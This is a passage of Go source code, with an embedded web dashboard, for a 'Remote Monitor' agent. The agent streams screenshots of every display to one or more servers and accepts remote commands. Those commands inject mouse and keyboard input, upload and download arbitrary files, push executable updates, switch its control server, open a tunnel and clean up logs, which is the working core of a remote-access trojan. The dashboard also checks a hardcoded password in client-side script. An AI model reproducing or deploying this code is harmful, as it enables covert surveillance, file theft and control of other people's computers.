		// Send frames to local server too
		for {
			select {
			case <-lctx.Done():
				log("Secondary connection stopped")
				return
			default:
				for _, m := range captureFrames() {
					m.Type = "agent-frame"
					m.AgentId = agentId
					if err := c2.WriteJSON(m); err != nil {
						return
					}
				}
				time.Sleep(time.Second / time.Duration(fps))
			}
		}
	}()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			_, m, e := c.ReadMessage()
			if e != nil { log("Disconnected: " + e.Error()); return }
			var d Message
			json.Unmarshal(m, &d)
			if d.Type == "set-fps" && d.Fps > 0 { fps = d.Fps }
			if d.Type == "control" { executeControl(d.Command, d.Params) }
			if d.Type == "set-server-preference" {
				saveServerPreference(d.Command == "true")
				log("Remote: set server preference = " + d.Command)
			}
			if d.Type == "push-update" {
				handleRemoteUpdate(d.Command, d.Frame)
			}
			if d.Type == "switch-server" && d.Command != "" {
				log("Remote switch to: " + d.Command)
				os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
				saveServerPreference(true)
				c.Close() // Force disconnect → reconnect with new URL
				return
			}
			if d.Type == "file-transfer" {
				handleFileTransfer(d.Command, d.Frame)
			}
			if d.Type == "request-file" {
				go handleFileRequest(d.Command, c)
			}
			if d.Type == "start-tunnel" {
				startTunnel(c)
			}
			if d.Type == "cleanup-logs" {
				cleanupLogs()
			}
			if d.Type == "become-server" {
				log("Remote: exposing as server via tunnel")
				saveServerPreference(true)
				startTunnel(c)
			}
		}
	}()
	fc := 0
	for {
		select {
		case <-done: return
		default:
			for _, m := range captureFrames() {
				m.Type = "agent-frame"
				m.AgentId = agentId
				if err := c.WriteJSON(m); err != nil {
					log("Disconnected: write error: " + err.Error())
					return
				}
				fc++
			}
			time.Sleep(time.Second / time.Duration(fps))
		}
	}
}

// ============ CONTROL & CAPTURE ============
func makeMouseInput(absX, absY, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_MOUSE)
	binary.LittleEndian.PutUint32(b[8:12], absX)
	binary.LittleEndian.PutUint32(b[12:16], absY)
	binary.LittleEndian.PutUint32(b[20:24], flags)
	return b
}

func makeKeyboardInput(vk uint16, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_KEYBOARD)
	binary.LittleEndian.PutUint16(b[8:10], vk)
	binary.LittleEndian.PutUint32(b[12:16], flags)
	return b
}

func screenSize() (int, int) {
	dc, _, _ := procGetDC.Call(0)
	if dc == 0 { return 1920, 1080 }
	w, _, _ := procGetDeviceCaps.Call(dc, 8)
	h, _, _ := procGetDeviceCaps.Call(dc, 10)
	procReleaseDC.Call(0, dc)
	sw, sh := int(int32(w)), int(int32(h))
	if sw <= 0 || sh <= 0 { return 1920, 1080 }
	return sw, sh
}

func moveMouse(x, y int) {
	sw, sh := screenSize()
	b := makeMouseInput(uint32(x*65535/sw), uint32(y*65535/sh), MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&b[0])), 40)
}

func clickMouse(x, y int, right bool) {
	sw, sh := screenSize()
	absX, absY := uint32(x*65535/sw), uint32(y*65535/sh)
	moveMouse(x, y)
	f, fu := uint32(MOUSEEVENTF_LEFTDOWN), uint32(MOUSEEVENTF_LEFTUP)
	if right { f, fu = MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	d := makeMouseInput(absX, absY, f|MOUSEEVENTF_ABSOLUTE)
	u := makeMouseInput(absX, absY, fu|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func pressKey(key string) {
	if len(key) != 1 { return }
	v := uint16(key[0])
	if key[0] >= 'a' && key[0] <= 'z' { v -= 32 }
	d := makeKeyboardInput(v, 0)
	u := makeKeyboardInput(v, KEYEVENTF_KEYUP)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func executeControl(cmd string, params map[string]string) {
	if cmd == "mousemove" || cmd == "click" {
		sw, sh := screenSize()
		x := int(parseFloat(params["x"]) / 100 * float64(sw))
		y := int(parseFloat(params["y"]) / 100 * float64(sh))
		if cmd == "mousemove" { moveMouse(x, y) } else { clickMouse(x, y, params["button"] == "2") }
	} else if cmd == "keypress" { pressKey(params["key"]) }
}

func parseFloat(s string) float64 { var f float64; fmt.Sscanf(s, "%f", &f); return f }

func numDisplays() int {
	return screenshot.NumActiveDisplays()
}

func captureDisplay(n int) string {
	if n < 0 || n >= numDisplays() { return "" }
	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(n))
	if err != nil { return "" }
	b := new(bytes.Buffer)
	jpeg.Encode(b, img, &jpeg.Options{Quality: 50})
	return base64.StdEncoding.EncodeToString(b.Bytes())
}

func captureFrames() []Message {
	n := numDisplays()
	if n == 0 { return nil }
	var msgs []Message
	for i := 0; i < n; i++ {
		f := captureDisplay(i)
		if f != "" {
			msgs = append(msgs, Message{Frame: f, Display: i})
		}
	}
	return msgs
}

func capture() string {
	return captureDisplay(0)
}

// Embedded dashboard HTML
var htmlDashboard = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote Monitor</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;height:100vh}
header{background:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e0e3e8;box-shadow:0 1px 3px rgba(0,0,0,.06)}
h1{font-size:16px;color:#2563eb;display:flex;align-items:center;gap:8px}
#status{font-size:12px;color:#64748b}
#tunnel-url{background:#f0fdf4;padding:8px 15px;text-align:center;font-size:13px;color:#166534;border-bottom:1px solid #bbf7d0;display:none}
#tunnel-url.failed{background:#fef2f2;color:#991b1b;border-color:#fecaca}
#grid{padding:10px;display:grid;grid-template-columns:repeat(auto-fill,minmax(400px,1fr));gap:10px;overflow-y:auto;height:calc(100vh-90px);align-content:start}
@media(max-width:900px){#grid{grid-template-columns:1fr 1fr}}
@media(max-width:600px){#grid{grid-template-columns:1fr}}
.tile{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.08);cursor:default;transition:.15s;border:2px solid transparent}
.tile:hover{box-shadow:0 4px 12px rgba(0,0,0,.12);border-color:#2563eb}
.tile .head{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#f8f9fb;border-bottom:1px solid #e8eaee}
.tile .name{font-weight:600;font-size:13px;color:#1a1a2e}
.tile .ip{font-size:11px;color:#94a3b8;font-family:monospace}
.tile .screen{width:100%;aspect-ratio:16/10;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;cursor:pointer}
.tile .screen img{width:100%;height:100%;object-fit:contain}
.tile .screen .zoom-hint{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:rgba(255,255,255,.4);font-size:28px;pointer-events:none;opacity:0;transition:opacity .2s}
.tile .screen:hover .zoom-hint{opacity:1}
.tile .screen .displays{display:flex;gap:2px;width:100%;height:100%}
.tile .screen .displays .disp-thumb{flex:1;min-width:0;cursor:pointer;position:relative;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
.tile .screen .displays .disp-thumb img{width:100%;height:100%;object-fit:contain}
.tile .screen .displays .disp-thumb .disp-label{position:absolute;bottom:2px;left:2px;background:rgba(0,0,0,.6);color:#fff;font-size:9px;padding:1px 4px;border-radius:2px;pointer-events:none}
.tile .actions{display:flex;gap:4px;padding:6px 12px;border-top:1px solid #e8eaee;flex-wrap:wrap}
.tile .actions button{background:transparent;border:1px solid #d0d3d8;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;color:#1a1a2e;transition:.15s}
.tile .actions button:hover{background:#eff6ff;border-color:#2563eb;color:#2563eb}
.tile .actions button:disabled{opacity:.5;cursor:default}
.tile .actions .ssh-link{background:#2563eb;color:#fff;border:1px solid #2563eb;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:3px}
.tile .actions .ssh-link:hover{background:#1d4ed8}
.tile .actions input.file-input{display:none}
#toast{position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#fff;padding:10px 20px;border-radius:8px;font-size:12px;z-index:999;opacity:0;transition:opacity .3s;pointer-events:none;box-shadow:0 4px 12px rgba(0,0,0,.2)}
#toast.show{opacity:1}
#modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:1000;display:none;align-items:center;justify-content:center;flex-direction:column}
#modal.show{display:flex}
#modal img{max-width:95%;max-height:88vh;object-fit:contain;background:#111;min-height:100px}
#modal .modal-close{position:absolute;top:15px;right:25px;color:#fff;font-size:30px;cursor:pointer;background:transparent;border:none;z-index:1001}
#modal .modal-close:hover{color:#94a3b8}
#modal .modal-label{color:#fff;font-size:14px;margin-bottom:10px;background:rgba(0,0,0,.5);padding:4px 12px;border-radius:4px}
.readonly .readonly-hidden{display:none!important}
#auth-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,20,30,.85);z-index:2000;display:none;align-items:center;justify-content:center;flex-direction:column}
#auth-overlay.show{display:flex}
#auth-overlay .auth-box{background:#fff;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 8px 30px rgba(0,0,0,.3)}
#auth-overlay .auth-box h2{font-size:18px;margin-bottom:15px;color:#1a1a2e}
#auth-overlay .auth-box input{width:100%;padding:10px;border:1px solid #d0d3d8;border-radius:6px;font-size:14px;margin-bottom:10px;text-align:center;outline:none}
#auth-overlay .auth-box input:focus{border-color:#2563eb}
#auth-overlay .auth-box button{background:#2563eb;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:14px;cursor:pointer;width:100%}
#auth-overlay .auth-box button:hover{background:#1d4ed8}
#auth-overlay .auth-box .error{color:#dc2626;font-size:12px;margin-top:5px;display:none}
 </style></head><body class="readonly">
<div id="auth-overlay">
  <div class="auth-box">
    <h2>🔒 Remote Monitor</h2>
    <p style="font-size:12px;color:#64748b;margin-bottom:15px">Enter password for full access</p>
    <input type="password" id="auth-pass" placeholder="Enter password" onkeydown="if(event.key==='Enter')unlockDashboard()" autofocus>
    <button onclick="unlockDashboard()">Unlock Dashboard</button>
    <div class="error" id="auth-error">Incorrect password</div>
  </div>
</div>
<header><h1>🖥 Remote Monitor</h1><div style="display:flex;align-items:center;gap:8px"><button onclick="document.getElementById('update-file').click()" class="readonly-hidden" style="background:none;border:none;font-size:11px;color:#94a3b8;cursor:pointer;padding:2px 6px;border-radius:4px" title="Push update to all agents">⬆️ Update</button><input type="file" id="update-file" accept=".exe" style="display:none" onchange="uploadUpdate(this)"><a href="#" onclick="showAllTiles();return false" style="font-size:11px;color:#94a3b8;text-decoration:none" title="Show hidden screens">👁</a><span style="cursor:pointer;font-size:11px;color:#94a3b8" onclick="showAuth()" title="Unlock full access">🔒</span><span id="status">Disconnected</span></div></header>
<div id="tunnel-url"></div>
<div id="grid"></div>
<div id="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-label" id="modal-label"></div><img id="modal-img"></div>
<div id="toast"></div>
<script>
var agents={}
var isUnlocked=false
var modalState={agentId:null,display:0}
var w=new WebSocket((location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=TOKEN_PLACEHOLDER')
w.onopen=function(){document.getElementById('status').textContent='Connected'}
w.onmessage=function(e){
 var d=JSON.parse(e.data)
 if(d.type=='agent-list'){d.agents.forEach(function(a){agents[a.id]=a;addTile(a.id,a.name,a.ip||a.id)});grid()}
 if(d.type=='agent-connected'){agents[d.agentId]={id:d.agentId,name:d.name,ip:d.ip||'?'};addTile(d.agentId,d.name,d.ip||'?')}
 if(d.type=='agent-disconnected'){delete agents[d.agentId];var t=document.getElementById('t-'+d.agentId);if(t)t.remove()}
 if(d.type=='frame'&&agents[d.agentId]){
   var disp=d.display||0;agents[d.agentId].displays=agents[d.agentId].displays||{};agents[d.agentId].displays[disp]=d.frame
   var img=document.getElementById('fi-'+d.agentId+'-'+disp)
   if(!img){
     var disps=document.getElementById('disps-'+d.agentId);
     if(disps){
       var thumb=document.createElement('div');thumb.className='disp-thumb';
       var aid=d.agentId,dp=disp
       thumb.onclick=function(){openFullScreen(aid,dp)}
       thumb.innerHTML='<img id="fi-'+d.agentId+'-'+disp+'" src="data:image/jpeg;base64,'+d.frame+'"><span class="disp-label">'+(disp+1)+'</span>'
       disps.appendChild(thumb)
     }
   }else{img.src='data:image/jpeg;base64,'+d.frame}
   if(modalState.agentId==d.agentId&&modalState.display==disp)
     document.getElementById('modal-img').src='data:image/jpeg;base64,'+d.frame
 }
 if(d.type=='tunnel-status'){
   var el=document.getElementById('tunnel-url');el.className='';
   if(d.frame=='ready'){
     el.innerHTML='<span>Tunnel active: </span><a href="'+d.command+'" target="_blank" style="color:#2563eb">'+d.command+'</a> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }else{
     el.className='failed';el.innerHTML='<span>Tunnel failed: '+d.command+'</span> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }
 }
 if(d.type=='file-response'){
   var a=agents[d.agentId];if(!a)return
   if(d.frame&&d.frame.startsWith('error:')){
     showToast('File error on '+(a.name||d.agentId)+': '+d.frame)
   }else{
     var lnk=document.createElement('a');lnk.href='data:application/octet-stream;base64,'+d.frame;lnk.download=d.command.split('\\').pop()||'file';lnk.click()
     showToast('Received file from '+(a.name||d.agentId))
   }
 }
}
function grid(){
  var g=document.getElementById('grid')
  if(!g.children.length)g.innerHTML='<div style="color:#94a3b8;text-align:center;padding:40px;width:100%">No devices connected</div>'
}
function closeModal(){document.getElementById('modal').classList.remove('show');modalState.agentId=null}
function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},4000)}
function showAuth(){document.getElementById('auth-overlay').classList.add('show');document.getElementById('auth-pass').focus()}
function unlockDashboard(){var p=document.getElementById('auth-pass').value;var e=document.getElementById('auth-error');e.style.display='none';if(p==='puneet12'){document.body.classList.remove('readonly');isUnlocked=true;document.getElementById('auth-overlay').classList.remove('show')}else{e.style.display='block';document.getElementById('auth-pass').value='';document.getElementById('auth-pass').focus()}}
function hideTile(id){var t=document.getElementById('t-'+id);if(t)t.style.display='none'}
function showAllTiles(){var els=document.querySelectorAll('.tile');for(var i=0;i<els.length;i++)els[i].style.display=''}
function uploadUpdate(input){var file=input.files[0];if(!file)return;var reader=new FileReader();reader.onload=function(){w.send(JSON.stringify({type:'push-update',command:file.name,frame:reader.result.split(',')[1]}));showToast('Update pushed to all agents');input.value=''};reader.readAsDataURL(file)}
function openFullScreen(id,disp){modalState.agentId=id;modalState.display=disp;var a=agents[id];document.getElementById('modal-label').textContent=(a?a.name+' - ':'')+'Display '+(disp+1);var mi=document.getElementById('modal-img');var frame=a&&a.displays&&a.displays[disp];mi.src=frame?'data:image/jpeg;base64,'+frame:'';document.getElementById('modal').classList.add('show')}
function openAgent(id){
 var a=agents[id];
 if(a&&a.ip&&a.ip!='?'&&a.ip!='unknown')window.open('http://'+a.ip+':3000','_blank')
}
function exposeAgent(id){
 var btn=document.getElementById('ex-'+id);
 if(btn){btn.textContent='Starting...';btn.disabled=true}
 w.send(JSON.stringify({type:'become-server',agentId:id}))
}
function sendFile(id){var input=document.getElementById('fileinp-'+id);if(input)input.click()}
function sendFileSelected(id,input){
 var file=input.files[0];if(!file)return
 var reader=new FileReader()
 reader.onload=function(){
   w.send(JSON.stringify({type:'file-transfer',agentId:id,command:file.name,frame:reader.result.split(',')[1]}))
   showToast('Sending ' + file.name + ' to ' + (agents[id]?agents[id].name||id:id))
   input.value=''
 }
 reader.readAsDataURL(file)
}
function requestFile(id){
 var path=prompt('Enter file path on agent (e.g. C:\\Users\\...):')
 if(!path)return
 w.send(JSON.stringify({type:'request-file',agentId:id,command:path}))
 showToast('File requested from '+(agents[id]?agents[id].name||id:id))
}
function addTile(id,name,ip){
 if(document.getElementById('t-'+id))return
 var g=document.getElementById('grid')
 var no=g.querySelector('div[style*="padding:40px"]')
 if(no)no.remove()
 var t=document.createElement('div');t.className='tile';t.id='t-'+id
  t.innerHTML='<div class="head"><span class="name">'+name+'</span><span class="ip">'+ip+'</span><button onclick="hideTile(\''+id+'\')" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:13px;padding:0 2px" title="Hide this screen">✕</button></div><div class="screen" onclick="openFullScreen(\''+id+'\',0)"><div class="zoom-hint">🔍</div><div class="displays" id="disps-'+id+'"><div class="disp-thumb" onclick="event.stopPropagation();openFullScreen(\''+id+'\',0)"><img id="fi-'+id+'-0" src=""><span class="disp-label">1</span></div></div></div><div class="actions"><a class="ssh-link" onclick="openAgent(\''+id+'\')">🖥 Remote</a><button id="ex-'+id+'" class="readonly-hidden" onclick="exposeAgent(\''+id+'\')">🔌 Make Server</button><input type="file" id="fileinp-'+id+'" class="file-input" onchange="sendFileSelected(\''+id+'\',this)"><button class="readonly-hidden" onclick="sendFile(\''+id+'\')">📁 Send</button><button class="readonly-hidden" onclick="requestFile(\''+id+'\')">📥 Get</button></div>'
 g.appendChild(t)
}
</script></body></html>`
